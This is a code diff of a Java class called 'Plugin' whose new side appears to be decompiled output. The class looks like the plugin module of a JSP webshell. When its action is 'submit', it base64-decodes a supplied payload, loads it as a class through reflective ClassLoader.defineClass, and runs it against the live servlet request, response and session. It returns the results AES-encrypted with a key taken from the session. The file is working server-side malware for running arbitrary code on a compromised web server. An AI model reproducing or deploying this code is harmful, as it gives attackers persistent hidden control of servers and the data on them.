@@ -13,12 +13,15 @@ import java.util.HashMap;
 import java.util.Map;
 
 public class Plugin {
+    public static String taskID;
     public static String action;
     public static String payload;
-    public static String taskID;
     private ServletRequest Request;
     private ServletResponse Response;
     private HttpSession Session;
+
+    public Plugin() {
+    }
 
     public boolean equals(Object obj) {
         PageContext page = (PageContext) obj;
@@ -26,163 +29,218 @@ public class Plugin {
         this.Response = page.getResponse();
         this.Request = page.getRequest();
         page.getResponse().setCharacterEncoding("UTF-8");
-        Map<String, String> result = new HashMap<>();
+        Map result = new HashMap();
         if (action.equals("submit")) {
-            ClassLoader classLoader = getClass().getClassLoader();
-            try {
-                Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
-                method.setAccessible(true);
-                byte[] payloadData = base64decode(payload);
-                Class payloadCls = (Class) method.invoke(classLoader, payloadData, 0, Integer.valueOf(payloadData.length));
-                Object payloadObj = payloadCls.newInstance();
-                payloadCls.getDeclaredMethod("execute", ServletRequest.class, ServletResponse.class, HttpSession.class).invoke(payloadObj, this.Request, this.Response, this.Session);
-                result.put("msg", "任务提交成功");
-                result.put("status", "success");
+            ClassLoader classLoader = this.getClass().getClassLoader();
+            Class urlClass = ClassLoader.class;
+            boolean var36 = false;
+
+            ServletOutputStream so;
+            label207:
+            {
                 try {
-                    ServletOutputStream so = this.Response.getOutputStream();
-                    so.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
+                    var36 = true;
+                    Method method = urlClass.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
+                    method.setAccessible(true);
+                    byte[] payloadData = this.base64decode(payload);
+                    Class payloadCls = (Class) method.invoke(classLoader, payloadData, 0, payloadData.length);
+                    Object payloadObj = payloadCls.newInstance();
+                    Method payloadMethod = payloadCls.getDeclaredMethod("execute", ServletRequest.class, ServletResponse.class, HttpSession.class);
+                    payloadMethod.invoke(payloadObj, this.Request, this.Response, this.Session);
+                    result.put("msg", "任务提交成功");
+                    result.put("status", "success");
+                    var36 = false;
+                    break label207;
+                } catch (Exception var43) {
+                    var43.printStackTrace();
+                    result.put("msg", var43.getMessage());
+                    result.put("status", "fail");
+                    var36 = false;
+                } finally {
+                    if (var36) {
+                        try {
+                            so = this.Response.getOutputStream();
+                            so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
+                            so.flush();
+                            so.close();
+                            page.getOut().clear();
+                        } catch (Exception var37) {
+                            var37.printStackTrace();
+                        }
+
+                    }
+                }
+
+                try {
+                    so = this.Response.getOutputStream();
+                    so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
                     so.flush();
                     so.close();
                     page.getOut().clear();
-                    return true;
-                } catch (Exception e) {
-                    e.printStackTrace();
-                    return true;
+                } catch (Exception var41) {
+                    var41.printStackTrace();
                 }
-            } catch (Exception e2) {
-                e2.printStackTrace();
-                result.put("msg", e2.getMessage());
-                result.put("status", "fail");
-                try {
-                    ServletOutputStream so2 = this.Response.getOutputStream();
-                    so2.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
-                    so2.flush();
-                    so2.close();
-                    page.getOut().clear();
-                    return true;
-                } catch (Exception e3) {
-                    e3.printStackTrace();
-                    return true;
-                }
-            } catch (Throwable th) {
-                try {
-                    ServletOutputStream so3 = this.Response.getOutputStream();
-                    so3.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
-                    so3.flush();
-                    so3.close();
-                    page.getOut().clear();
-                } catch (Exception e4) {
-                    e4.printStackTrace();
-                }
-                throw th;
+
+                return true;
             }
-        } else if (!action.equals("getResult")) {
-            return true;
-        } else {
+
             try {
-                Map<String, String> taskResult = (Map) this.Session.getAttribute(taskID);
-                Map<String, String> temp = new HashMap<>();
-                temp.put("running", taskResult.get("running"));
-                temp.put("result", base64encode(taskResult.get("result")));
-                result.put("msg", buildJson(temp, false));
-                result.put("status", "success");
+                so = this.Response.getOutputStream();
+                so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
+                so.flush();
+                so.close();
+                page.getOut().clear();
+            } catch (Exception var42) {
+                var42.printStackTrace();
+            }
+        } else if (action.equals("getResult")) {
+            boolean var25 = false;
+
+            ServletOutputStream so;
+            label208:
+            {
                 try {
-                    ServletOutputStream so4 = this.Response.getOutputStream();
-                    so4.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
-                    so4.flush();
-                    so4.close();
-                    page.getOut().clear();
-                    return true;
-                } catch (Exception e5) {
-                    e5.printStackTrace();
-                    return true;
+                    var25 = true;
+                    Map taskResult = (Map) this.Session.getAttribute(taskID);
+                    Map temp = new HashMap();
+                    temp.put("running", taskResult.get("running"));
+                    temp.put("result", this.base64encode((String) taskResult.get("result")));
+                    result.put("msg", this.buildJson(temp, false));
+                    result.put("status", "success");
+                    var25 = false;
+                    break label208;
+                } catch (Exception var45) {
+                    result.put("msg", var45.getMessage());
+                    result.put("status", "fail");
+                    var25 = false;
+                } finally {
+                    if (var25) {
+                        try {
+                            so = this.Response.getOutputStream();
+                            so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
+                            so.flush();
+                            so.close();
+                            page.getOut().clear();
+                        } catch (Exception var38) {
+                            var38.printStackTrace();
+                        }
+
+                    }
                 }
-            } catch (Exception e6) {
-                result.put("msg", e6.getMessage());
-                result.put("status", "fail");
+
                 try {
-                    ServletOutputStream so5 = this.Response.getOutputStream();
-                    so5.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
-                    so5.flush();
-                    so5.close();
+                    so = this.Response.getOutputStream();
+                    so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
+                    so.flush();
+                    so.close();
                     page.getOut().clear();
-                    return true;
-                } catch (Exception e7) {
-                    e7.printStackTrace();
-                    return true;
+                } catch (Exception var39) {
+                    var39.printStackTrace();
                 }
-            } catch (Throwable th2) {
-                try {
-                    ServletOutputStream so6 = this.Response.getOutputStream();
-                    so6.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
-                    so6.flush();
-                    so6.close();
-                    page.getOut().clear();
-                } catch (Exception e8) {
-                    e8.printStackTrace();
-                }
-                throw th2;
+
+                return true;
+            }
+
+            try {
+                so = this.Response.getOutputStream();
+                so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
+                so.flush();
+                so.close();
+                page.getOut().clear();
+            } catch (Exception var40) {
+                var40.printStackTrace();
             }
         }
+
+        return true;
     }
 
     private byte[] Encrypt(byte[] bs) throws Exception {
-        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getAttribute("u").toString().getBytes(StandardCharsets.UTF_8), "AES");
+        String key = this.Session.getAttribute("u").toString();
+        byte[] raw = key.getBytes(StandardCharsets.UTF_8);
+        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
         Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
         cipher.init(1, skeySpec);
-        return cipher.doFinal(bs);
+        byte[] encrypted = cipher.doFinal(bs);
+        return encrypted;
     }
 
-    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
+    private String buildJson(Map entity, boolean encode) throws Exception {
         StringBuilder sb = new StringBuilder();
         String version = System.getProperty("java.version");
         sb.append("{");
-        for (String key : entity.keySet()) {
+
+        for (Object o : entity.keySet()) {
+            String key = (String) o;
             sb.append("\"" + key + "\":\"");
-            String value = entity.get(key);
+            String value = ((String) entity.get(key));
             if (encode) {
+                Class Base64;
+                Object Encoder;
                 if (version.compareTo("1.9") >= 0) {
-                    getClass();
-                    Class Base64 = Class.forName("java.util.Base64");
-                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
+                    this.getClass();
+                    Base64 = Class.forName("java.util.Base64");
+                    Encoder = Base64.getMethod("getEncoder", (Class[]) null).invoke(Base64, (Object[]) null);
                     value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                 } else {
-                    getClass();
-                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
-                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes(StandardCharsets.UTF_8))).replace("\n", "").replace("\r", "");
+                    this.getClass();
+                    Base64 = Class.forName("sun.misc.BASE64Encoder");
+                    Encoder = Base64.newInstance();
+                    value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
+                    value = value.replace("\n", "").replace("\r", "");
                 }
             }
+
             sb.append(value);
             sb.append("\",");
         }
+
         if (sb.toString().endsWith(",")) {
             sb.setLength(sb.length() - 1);
         }
+
         sb.append("}");
         return sb.toString();
     }
 
     private String base64encode(String clearText) throws Exception {
-        if (System.getProperty("java.version").compareTo("1.9") >= 0) {
-            getClass();
-            Class Base64 = Class.forName("java.util.Base64");
-            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
-            return (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, clearText.getBytes(StandardCharsets.UTF_8));
+        String result = "";
+        String version = System.getProperty("java.version");
+        Class Base64;
+        Object Encoder;
+        if (version.compareTo("1.9") >= 0) {
+            this.getClass();
+            Base64 = Class.forName("java.util.Base64");
+            Encoder = Base64.getMethod("getEncoder", (Class[]) null).invoke(Base64, (Object[]) null);
+            result = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, clearText.getBytes(StandardCharsets.UTF_8));
+        } else {
+            this.getClass();
+            Base64 = Class.forName("sun.misc.BASE64Encoder");
+            Encoder = Base64.newInstance();
+            result = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, clearText.getBytes(StandardCharsets.UTF_8));
+            result = result.replace("\n", "").replace("\r", "");
         }
-        getClass();
-        Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
-        return ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, clearText.getBytes(StandardCharsets.UTF_8))).replace("\n", "").replace("\r", "");
+
+        return result;
     }
 
     private byte[] base64decode(String base64Text) throws Exception {
-        if (System.getProperty("java.version").compareTo("1.9") >= 0) {
-            getClass();
-            Class Base64 = Class.forName("java.util.Base64");
-            Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
-            return (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
+        String version = System.getProperty("java.version");
+        byte[] result;
+        Class Base64;
+        Object Decoder;
+        if (version.compareTo("1.9") >= 0) {
+            this.getClass();
+            Base64 = Class.forName("java.util.Base64");
+            Decoder = Base64.getMethod("getDecoder", (Class[]) null).invoke(Base64, (Object[]) null);
+            result = (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
+        } else {
+            this.getClass();
+            Base64 = Class.forName("sun.misc.BASE64Decoder");
+            Decoder = Base64.newInstance();
+            result = (byte[]) Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text);
         }
-        getClass();
-        Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
-        return (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, base64Text);
+
+        return result;
     }
 }
